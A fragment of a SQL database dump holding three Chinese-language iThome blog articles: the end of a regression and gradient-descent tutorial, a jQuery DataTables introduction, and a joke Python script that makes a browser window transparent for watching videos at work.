1、3、9，並來查看隨著次方數的增長對於模型的擬合程度的影響。</p>\n<pre><code class="language-py"># 測試資料集\nx_test = np.linspace(-0.1,1.1,500)[:,None]\n# 繪製真實答案的分佈\nplt.scatter(X.ravel(),y,color=''black'')\n\n# 測試 1,3,7 的degree\nfor degree in [1,3,9]:\n    y_test=PolynomialRegression(degree).fit(X,y).predict(x_test)\n    plt.plot(x_test.ravel(),y_test,label=''degree={}''.format(degree))\nplt.xlim(-0.1,1.0)\nplt.ylim(-2,12)\nplt.legend(loc=''best'')\n</code></pre>\n<p>從訓練結果可以發現隨著次方數 degree 的增長模型會變得越複雜。同時對於訓練數據的擬合結果越好。但是這裡必須注意並非越大的 degree 就是越好的，因為隨著模型複雜會有過度擬合的跡象。因此我們必須找出一個適當的 degree 數值並與測試集驗證與評估。目標是訓練集與測試集的 MSE 差距要越小越好。如果我們一昧的追求訓練集的損失最小化，可能會影響到測試集的表現能力導致預測結果變差。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210920/20107247Wx2AximovL.png" alt="https://ithelp.ithome.com.tw/upload/images/20210920/20107247Wx2AximovL.png"></p>\n<h2>Gradient descent (梯度下降法)</h2>\n<p>接下來我們來討論優化問題的第二種方法，就是梯度下降法。梯度下降不僅限於線性迴歸，在非線性和神經網絡同樣適用。下圖中每一個點是訓練集的樣本 x 軸為輸入值 y 軸為輸出值。也就是平面上每個點 x 都會有一個相對應 y 的輸出，因此我們需要做的事情是為這些點訓練一個模型，使得這條直線能夠盡可能反映出 x 與 y 之間的關係。此外我們都知道在一個二維空間中我們能找到無數條直線，那我們該如何找到這條最佳的直線呢？簡單來說我們的目標是要使得這些訓練資料中的每個樣本點到這一條直線的距離平方和要最小。因此這裡我們將討論該如何使用梯度下降法來最佳化我們的模型。首先我們假設一個直線的方程式是 y = β0 + β1x。那首先我們可以先隨機的給予 β0 和 β1 一個初始值。並得到下圖中的結果，我們可以發現這一條直線並不能反映出 x 和 y 的關聯性。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210920/201072473Bb0Sq8UUy.png" alt="https://ithelp.ithome.com.tw/upload/images/20210920/201072473Bb0Sq8UUy.png"></p>\n<p>如果我們不斷的迭代，每一次的迭代都讓這一條直線朝著更符合數據點的方向移動一點，那麼經過許多次的更新我們就可以得到最佳的結果。簡單來說就是在每次的迭代要更新所有的參數，例如： β0 和 β1，直到得到最小的 MSE 或是預定的迭代次數。以下的公式就是梯度下降法的表達式。它反映的是每次迭代，我們的 β0 和 β1 這些參數是如何調整的。我們可以從這個公式得知，他是對損失函數求了某一個特定參數的偏導。這就是所謂的梯度，我們朝著梯度的反方向在更新。然而每一次要更新多大可以依靠 η（(eta) 來控制，因此我們算出來的梯度還會乘上一個學習速率來防止更新步伐太大而導致找不到解。所以 η 的大小要適中以免影響到模型最終的收斂。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210920/20107247A5QLqdJ8YA.png" alt="https://ithelp.ithome.com.tw/upload/images/20210920/20107247A5QLqdJ8YA.png"></p>\n<p>此外這個模型如果透過梯度下降法還有一個缺點，那就是當我們的損失函數不是一個凸函數(convex function) 的時候它就會存在許多個最低點，進而導致在我們選擇不同的 β0 和 β1 作為初始值的時候很可能會收斂於不同的局部最佳解(local optimum)。也就是說我們求得的最佳的模型很有機會是局部最佳解而不是全局最佳解(global optimum)。</p>\n<p><img src="https://i.imgur.com/YUb99rh.gif" alt=""></p>\n<h2>使用 Sklearn SGDRegressor</h2>\n<p>Sklearn 提供了 SGDRegressor 並實現了隨機梯度下降學習。你可能會問梯度下降與隨機梯度下降兩者差別在哪？簡單來說一般的梯度下降法是一次用全部訓練集的數據計算損失函數的梯度，然後做一次參數的更新修正。而隨機梯度下降法就是一次跑一個樣本或是小批次樣本，然後算出一次梯度並更新。而所謂的隨機就是在訓練過程中隨機地抽取樣本，所以才會稱為隨機梯度下降法。</p>\n<pre><code class="language-py">import numpy as np\nfrom sklearn.linear_model import SGDRegressor\nfrom sklearn.metrics import mean_squared_error\n\n# 隨機產生一個特徵的X與輸出y\nX, y = make_data(100)\n\n# 建立 SGDRegressor 並設置超參數\nregModel = SGDRegressor(max_iter=100)\n# 訓練模型\nregModel.fit(X, y)\n# 建立測試資料\nx_test = np.linspace(-0.05,1,500)[:,None]\n# 預測測試集\ny_test=regModel.predict(x_test)\n# 預測訓練集\ny_pred=regModel.predict(X)\n# 視覺化預測結果\nplt.scatter(X,y)\nplt.plot(x_test.ravel(),y_test, color="#d62728")\nplt.xlabel(''x'')\nplt.ylabel(''y'')\nplt.text(0, 10, ''Loss(MSE)=%.3f'' % mean_squared_error(y_pred, y), fontdict={''size'': 15, ''color'':  ''red''})\nplt.show()\n</code></pre>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210920/20107247tOL6SljPLx.png" alt="https://ithelp.ithome.com.tw/upload/images/20210920/20107247tOL6SljPLx.png"></p>\n<p>本系列教學內容及範例程式都可以從我的 <a href="https://github.com/andy6804tw/2021-13th-ironman" target="_blank">GitHub</a> 取得！</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'AI & Data',NULL,'2021-09-20 17:20:51');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10272439','第11車廂-table界的神器!DataTables介紹篇(1)','快搭上姐姐的`微`前端便車','11',replace('\n                        <div class="markdown__style">\n                                                            <blockquote>\n<p>延續上篇的table介紹，原本功能都要自己寫，那有沒有工具可以直接套用呢?有的!那就是神器DataTables拉!</p>\n</blockquote>\n<h3>簡介</h3>\n<p>DataTables 是 jQuery Javascript 庫的插件。它是一種高度靈活的工具，針對處理table資料非常方便，只要引入此套件就有像是分頁、搜尋、排序…等功能，也提供多項客製化選項，開發人員只需要下載並引用相關函式庫即可。</p>\n<h6>* 詳細可看 &gt;官網 <a href="https://datatables.net/" target="_blank">https://datatables.net/</a></h6>\n<h3>安裝方式</h3>\n<p>CDN、npm、require…等</p>\n<blockquote>\n<h6>* 詳細可看 &gt; 官網 <a href="https://datatables.net/manual/installation" target="_blank">https://datatables.net/manual/installation</a></h6>\n</blockquote>\n<h3>起手式 (CDN方式)</h3>\n<p><strong>//基本樣式</strong></p>\n<pre><code>//CSS\n    &lt;link rel="stylesheet" href="https://cdn.datatables.net/1.11.3/css/jquery.dataTables.min.css"&gt;\n//jq\n    &lt;script src="https://code.jquery.com/jquery-3.5.1.js"&gt;&lt;/script&gt;\n    &lt;script src="https://cdn.datatables.net/1.11.3/js/jquery.dataTables.min.js"&gt;&lt;/script&gt;\n</code></pre>\n<blockquote>\n<h6>* 還可以有套用bs3/bs4/bs5…等引入方式，詳細可看 &gt; 官網 <a href="https://datatables.net/examples/styling/index.html" target="_blank">https://datatables.net/examples/styling/index.html</a></h6>\n</blockquote>\n<p><strong>// 範例html</strong></p>\n<pre><code>&lt;h1&gt;datatable介紹&lt;/h1&gt;   \n&lt;table id="table_id" class="display"&gt;  \n    &lt;thead&gt;\n      &lt;tr&gt;\n        &lt;th&gt;信用卡公司&lt;/th&gt;\n        &lt;th&gt;回饋 / 名額&lt;/th&gt;\n        &lt;th&gt;五倍券優惠活動&lt;/th&gt;\n      &lt;/tr&gt;\n    &lt;/thead&gt;\n    &lt;tbody&gt;\n      &lt;tr&gt;\n        &lt;td&gt;兆豐銀行&lt;/td&gt;\n        &lt;td&gt;$300 產品（限量8萬名）&lt;br&gt;最高5千抽獎&lt;/td&gt;\n        &lt;td&gt;期限綁定台灣Pay/信用卡，可享一次抽獎，最高獎金5千元(110/12/31前)&lt;/td&gt;\n      &lt;/tr&gt;\n      .\n      .\n      .\n      &lt;tr&gt;....等列&lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n</code></pre>\n<p><strong>// Jq初始化語法</strong><br>\n$(datatable_id).DataTable();</p>\n<pre><code>$(document).ready( function () {\n    $(''#table_id'').DataTable(); \n} );\n</code></pre>\n<blockquote>\n<h6>其他初始化方式 * 詳細可看 &gt; 官網 <a href="https://datatables.net/examples/advanced_init/index.html" target="_blank">https://datatables.net/examples/advanced_init/index.html</a></h6>\n</blockquote>\n<p>這樣就可以完成拉！直接有排序／換頁／搜尋功能！<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210926/20142016TBaXkcYYOP.png" alt="https://ithelp.ithome.com.tw/upload/images/20210926/20142016TBaXkcYYOP.png"><br>\n收工ＸＤ<br>\n威！別急著走！<br>\n<img src="https://m.yh31.com/tp/zjbq/201909191343196243.gif" alt=""><br>\n剛剛我們範例table資料是死的，真正工作上我們資料應該是匯入的，再加上各專案上要客製化table的功能或其他，所以要設定其他參數，所以我們重新介紹一次！</p>\n<h3>完整語法結構</h3>\n<pre><code>$(datatable_id).DataTable({\n    設定屬性/預設功能區塊,\n    設定資料來源區塊(data or ajax….等),\n    設定資料欄位區塊(columns),\n    設定語言區塊(language),\n    設定欄位元素定義區塊(columnDefs),\n    設定列元素區塊(rowCallback)…等\n})\n</code></pre>\n<h4>設定屬性/預設功能區塊(options)</h4>\n<pre><code>$(datatable_id).DataTable({  \n    /*設定屬性(預設功能)區塊*/\n    "searching": false, // 預設為true 搜尋功能，若要開啟不用特別設定\n    "paging": false, // 預設為true 分頁功能，若要開啟不用特別設定\n    "ordering": false, // 預設為true 排序功能，若要開啟不用特別設定\n    "sPaginationType": "full_numbers", // 分頁樣式 預設為"full_numbers"，若需其他樣式才需設定\n    "lengthMenu": [[10, 25, 50, -1], [10, 25, 50, "All"]], //顯示筆數設定 預設為[10, 25, 50, 100]\n    "pageLength":''50''// 預設為''10''，若需更改初始每頁顯示筆數，才需設定\n    "processing": true, // 預設為false 是否要顯示當前資料處理狀態資訊\n    "serverSide": false, // 預設為false 是否透過Server端處理分頁…等\n    "stateSave": true, // 預設為false 在頁面刷新時，是否要保存當前表格資料與狀態\n    "destroy": true, // 預設為false 是否銷毀當前暫存資料\n    "info": true, // 預設為true　是否要顯示"目前有 x  筆資料"\n    "autoWidth": false, // 預設為true　設置是否要自動調整表格寬度(false代表不要自適應)　　　　\n    "scrollCollapse": true, // 預設為false 是否開始滾軸功能控制X、Y軸\n    "scrollY": "200px", // 若有設置為Y軸(垂直)最大高度\n    "dom": ''lrtip'',// 設置搜尋div、頁碼div...等基本位置/外觀..等，詳細可看官網\n    設定資料來源區塊(data or ajax….等),\n    設定資料欄位區塊(columns),\n    設定語言區塊(language),\n    設定欄位元素定義區塊(columnDefs),\n    設定列元素區塊(rowCallback)…等\n})\n</code></pre>\n<blockquote>\n<h6>其他options參數 * 詳細可看 &gt; 官網 <a href="https://datatables.net/manual/options" target="_blank">https://datatables.net/manual/options</a></h6>\n<h6>DOM設定 * 詳細可看 &gt; 官網 <a href="https://datatables.net/examples/basic_init/dom.html" target="_blank">https://datatables.net/examples/basic_init/dom.html</a></h6>\n</blockquote>\n<p>那其實若沒有要特別的要求，通常也不會特別設置options部分，就像起手式的介紹也沒特別設定喔！<br>\n所以我們就再來看看比較會出事的data部分</p>\n<h3>資料載入方式(可以有陣列/物件或ajax...)</h3>\n<p>link(同上方起手式)</p>\n<pre><code>&lt;link rel="stylesheet" href="https://cdn.datatables.net/1.11.3/css/jquery.dataTables.min.css"&gt;\n&lt;script src="https://code.jquery.com/jquery-3.5.1.js"&gt;&lt;/script&gt;\n&lt;script src="https://cdn.datatables.net/1.11.3/js/jquery.dataTables.min.js"&gt;&lt;/script&gt;\n</code></pre>\n<h4>陣列</h4>\n<ul>\n<li>\n<code>從陣列中獲取資料一定要有表頭，如果沒有則可能會報錯</code>\n</li>\n<li>data： 指定資料從dataset陣列來</li>\n<li>columns： 配置每一列的title(表頭)</li>\n</ul>\n<pre><code>/*HTML*/\n&lt;table id="tableArray" class="display" style="width:100%"&gt;&lt;/table&gt;\n/**/\n&lt;script&gt;\n$(document).ready( function () {\n    var dataset = [\n                [\n                    "Tiger Nixon",\n                    "System Architect",\n                    "Edinburgh",\n                    "5421",\n                    "2011/04/25",\n                    "$3,120"\n                ],\n                [\n                    "Garrett Winters",\n                    "Director",\n                    "Edinburgh",\n                    "8422",\n                    "2011/07/25",\n                    "$5,300"\n                ]\n            ];\n\n    $(''#tableArray'').DataTable({\n        "data": dataset,\n        "columns": [ // 列的標題一般是從DOM中讀取（也可以使用這個屬性為表格創建列標題)\n          { title: "姓名" },\n          { title: "職位" },\n          { title: "辦公室" },\n          { title: "分機" },\n          { title: "開始工作日" },\n          { title: "薪資" },\n        ]\n    })\n\n}); \n&lt;/script&gt;\n</code></pre>\n<p>剛剛上面有註解說，<code>列的標題一般是從DOM中讀取，也可以從"columns"定義</code>，所以<br>\n這邊其實也可以寫成</p>\n<pre><code>&lt;table id="tableArray" class="display" style="width:100%"&gt;\n    &lt;thead&gt;\n        &lt;tr&gt;\n            &lt;th&gt;姓名&lt;/th&gt;\n            &lt;th&gt;職位&lt;/th&gt;\n            &lt;th&gt;薪資&lt;/th&gt;\n            &lt;th&gt;開始工作日&lt;/th&gt;\n            &lt;th&gt;辦公室&lt;/th&gt;\n            &lt;th&gt;分機&lt;/th&gt;\n        &lt;/tr&gt;\n    &lt;/thead&gt;   \n&lt;/table&gt;\n&lt;script&gt;\n$(document).ready( function () {\n    var dataset = [\n                    [\n                        "Tiger Nixon",\n                        "System Architect",\n                        "Edinburgh",\n                        "5421",\n                        "2011/04/25",\n                        "$3,120"\n                    ],\n                    [\n                        "Garrett Winters",\n                        "Director",\n                        "Edinburgh",\n                        "8422",\n                        "2011/07/25",\n                        "$5,300"\n                    ]\n                ]\n\n    $(''#tableArray'').DataTable({\n        "data": dataset,\n    })\n});      \n&lt;/script&gt;\n</code></pre>\n<h4>物件</h4>\n<ul>\n<li>\n<code>使用物件陣列，一定要配置columns的data</code>，告訴DataTables每列對應的屬性名稱，title則會給表格新增表頭名稱</li>\n</ul>\n<pre><code>/*HTML*/\n&lt;table id="tableObj" class="display" style="width:100%"&gt;&lt;/table&gt;\n/**/\n&lt;script&gt;\n$(document).ready( function () {\n    var data = [\n                {\n                    "name":       "Tiger Nixon",\n                    "position":   "System Architect",\n                    "salary":     "$3,120",\n                    "start_date": "2011/04/25",\n                    "office":     "Edinburgh",\n                    "extn":       "5421"\n                },\n                {\n                    "name":       "Garrett Winters",\n                    "position":   "Director",\n                    "salary":     "$5,300",\n                    "start_date": "2011/07/25",\n                    "office":     "Edinburgh",\n                    "extn":       "8422"\n                }\n            ];\n            \n    $(''#tableObj'').DataTable({\n        "data": data,\n        "columns": [ //列的標題一般是從DOM中讀取（也可以使用這個屬性為表格創建列標題)\n        { data: ''name'', title: "姓名" },\n        { data: ''position'', title: "職位" },\n        { data: ''salary'', title: "薪資" },\n        { data: ''start_date'', title: "開始工作日" },\n        { data: ''office'', title: "辦公室" },\n        { data: ''extn'', title: "分機" },\n        ]\n    })\n});\n&lt;/script&gt;\n</code></pre>\n<p>同上說明，列的標題一般是從DOM中讀取，也可以從"columns"定義，所以<br>\n這邊其實也可以寫成(如下)，但與陣列不同的是，還是要定義<code>columns的data</code>喔!</p>\n<pre><code>&lt;table id="tableObj" class="display" style="width:100%"&gt;\n    &lt;thead&gt;\n        &lt;tr&gt;\n            &lt;th&gt;姓名&lt;/th&gt;\n            &lt;th&gt;職位&lt;/th&gt;\n            &lt;th&gt;薪資&lt;/th&gt;\n            &lt;th&gt;開始工作日&lt;/th&gt;\n            &lt;th&gt;辦公室&lt;/th&gt;\n            &lt;th&gt;分機&lt;/th&gt;\n        &lt;/tr&gt;\n    &lt;/thead&gt;\n&lt;/table&gt;\n&lt;script&gt;\n    $(document).ready( function () {\n        var data = [\n                    {\n                        "name":       "Tiger Nixon",\n                        "position":   "System Architect",\n                        "salary":     "$3,120",\n                        "start_date": "2011/04/25",\n                        "office":     "Edinburgh",\n                        "extn":       "5421"\n                    },\n                    {\n                        "name":       "Garrett Winters",\n                        "position":   "Director",\n                        "salary":     "$5,300",\n                        "start_date": "2011/07/25",\n                        "office":     "Edinburgh",\n                        "extn":       "8422"\n                    }\n                ]\n\n        $(''#tableObj'').DataTable({\n            "data": data,\n            // "columns": [\n            // { data: ''name'',title: "姓名" },\n            // { data: ''position'',title: "職位" },\n            // { data: ''salary'',title: "薪資" },\n            // { data: ''start_date'',title: "開始工作日" },\n            // { data: ''office'',title: "辦公室" },\n            // { data: ''extn'',title: "分機" },\n            // ]\n            "columns": [\n            { data: ''name'' },\n            { data: ''position'' },\n            { data: ''salary'' },\n            { data: ''start_date'' },\n            { data: ''office''},\n            { data: ''extn''},\n            ]\n        })\n\n    });\n&lt;/script&gt;\n</code></pre>\n<ul>\n<li>\n<h4>ajax</h4>\n</li>\n</ul>\n<p>HTML</p>\n<pre><code>&lt;table id="tableAjax" class="table table-striped table-bordered" style="width:100%"&gt;&lt;/table&gt;\n</code></pre>\n<p>JSON</p>\n<ul>\n<li>為API抓回資料，這邊為測試用的JSON檔，<code>屬性需為"data"</code>否則抓不到資料</li>\n</ul>\n<pre><code>{\n    "data": [\n        {\n            "name":       "Tiger Nixon",\n            "position":   "System Architect",\n            "salary":     "$3,120",\n            "start_date": "2011/04/25",\n            "office":     "Edinburgh",\n            "extn":       "5421"\n        },\n        {\n            "name":       "Garrett Winters",\n            "position":   "Director",\n            "salary":     "$5,300",\n            "start_date": "2011/07/25",\n            "office":     "Edinburgh",\n            "extn":       "8422"\n        }\n    ]\n}\n</code></pre>\n<p>jq</p>\n<ul>\n<li>ajax接收的資料可以是陣列或者物件，注意columns的配置，可以對應參考上方兩種格式資料的處理</li>\n</ul>\n<pre><code>$(document).ready( function () {\n    $(''#tableAjax'').DataTable({\n        "ajax": ''data.json'',\n        "columns": [ //列的標題一般是從DOM中讀取（你還可以使用這個屬性為表格創建列標題)\n        { data: ''name'',title: "姓名" },\n        { data: ''position'',title: "職位"},\n        { data: ''salary'',title: "薪資" },\n        { data: ''start_date'',title: "開始工作日" },\n        { data: ''office'',title: "辦公室" },\n        { data: ''extn'',title: "分機" },\n        ]\n})\n</code></pre>\n<blockquote>\n<h6>其他data載入重點 * 詳細可看 &gt; 官網 <a href="https://datatables.net/manual/data/" target="_blank">https://datatables.net/manual/data/</a></h6>\n<h6>ajax載入重點 * 詳細可看 &gt; 官網 <a href="https://datatables.net/reference/option/ajax" target="_blank">https://datatables.net/reference/option/ajax</a></h6>\n</blockquote>\n<h3>設定資料欄位區塊(columns)</h3>\n<pre><code>$(datatable_id).DataTable({    \n    columns: [\n      { data: ''對應data的屬性名稱'', title:''欄位名稱'' ...等 },\n      { data: ''對應data的屬性名稱'', title:''欄位名稱'' ...等 },\n              .\n              .\n              .\n    ],\n})\n</code></pre>\n<p>這樣就完成啦！<br>\n<img src="https://j.gifs.com/Br64wx.gif" alt=""><br>\n但是這樣有英文好像不太搭耶！怎麼變語系呢？就下一篇再揭曉吧！<br>\n最後，如果不改資料來源，想要後續加一個欄位怎麼辦？<br>\n是在後面加一個｛data:"",title:"備註"｝嗎?<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210926/20142016xFvjfnWSF7.png" alt="https://ithelp.ithome.com.tw/upload/images/20210926/20142016xFvjfnWSF7.png"><br>\n疑!雖然畫面有顯示了 可是噴出error了！<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210926/20142016qxSUGjjPYR.png" alt="https://ithelp.ithome.com.tw/upload/images/20210926/20142016qxSUGjjPYR.png"><br>\n那這又怎麼解呢？就下一篇再揭曉吧！<img src="/images/emoticon/emoticon30.gif" alt="/images/emoticon/emoticon30.gif"></p>\n<p>本篇參考資料/延伸閱讀:<br>\n<a href="https://s123600g.medium.com/html-datatables%E7%B3%BB%E5%88%97%E7%AD%86%E8%A8%98-3198f3c9a046" target="_blank">https://s123600g.medium.com/html-datatables%E7%B3%BB%E5%88%97%E7%AD%86%E8%A8%98-3198f3c9a046</a><br>\n<a href="https://iter01.com/437540.html" target="_blank">https://iter01.com/437540.html</a><br>\n<a href="https://blog.csdn.net/LDY1016/article/details/84849227" target="_blank">https://blog.csdn.net/LDY1016/article/details/84849227</a></p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'Modern Web',NULL,'2021-09-26 15:09:09');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10258905','[Day1] 上班打混妙招! 光明正大偷看影片的方法!','奇怪的知識增加了!原來程式還可以這樣用?!','1',replace('\n                        <div class="markdown__style">\n                                                            <p>大家上班到一半是不是都很想看一下影片偷懶一下呢?<br>\n但是拿手機看又太明顯 開分頁切換又很累對吧?</p>\n<p>這邊教大家用python實現讓網頁視窗變透明的方法，讓大家可以在主管的眼皮子底下<br>\n光! 明! 正! 大! 的摸魚!</p>\n<p><strong>使用環境</strong></p>\n<ul>\n<li>\n<a href="https://www.python.org/downloads/" target="_blank">Python 3.9.2</a><br>\n(這邊預設大家都會使用python，所以就不贅述安裝步驟囉)</li>\n<li>\n<a href="https://notepad-plus-plus.org/downloads/" target="_blank">notepad++</a>\n</li>\n<li>\n<a href="https://pypi.org/project/pywin32/" target="_blank">pywin32</a> (尋找及控制視窗)</li>\n</ul>\n<p><strong>程式碼</strong></p>\n<pre><code>import win32gui\nimport win32con\nimport winxpgui\nimport win32api\nimport subprocess\nimport time\n\nsubprocess.Popen("start chrome", shell=True) ## 開啟chrome網頁\ntime.sleep(5) ## 這邊讓程式等個五秒，才能抓到下面顯示的頁簽內容\nhwnd = win32gui.FindWindow(None, "新分頁 - Google Chrome")  ## 後面的新分頁 - Google Chrome要填入頁簽顯示的名字喔\n\nwin32gui.SetWindowLong (hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong (hwnd, win32con.GWL_EXSTYLE ) | win32con.WS_EX_LAYERED )\nwinxpgui.SetLayeredWindowAttributes(hwnd, win32api.RGB(0,0,0), 30, win32con.LWA_ALPHA) ## 中間的30是透明度，數字越小越淺，可以自由更改\n</code></pre>\n<p><strong>執行結果</strong><br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210901/20133286hAxeIWhBLm.png" alt="https://ithelp.ithome.com.tw/upload/images/20210901/20133286hAxeIWhBLm.png"></p>\n<p>看到中間那個淡淡的google首頁了嗎!<br>\n我每天都用這個方法假裝自己在閱讀技術文件，其實都在偷看影片，從來沒被抓包過喔!</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210901/20133286tzP3xazNjM.png" alt="https://ithelp.ithome.com.tw/upload/images/20210901/20133286tzP3xazNjM.png"></p>\n<p>什麼?你說還是很明顯? 那就把透明度再調淡一點吧<br>\n你說太淡看不清楚嗎? 那就換一個深色的背景吧!(超不負責任&gt;&lt;)</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'Software Development',NULL,'2021-09-01 12:17:49');
COMMIT;
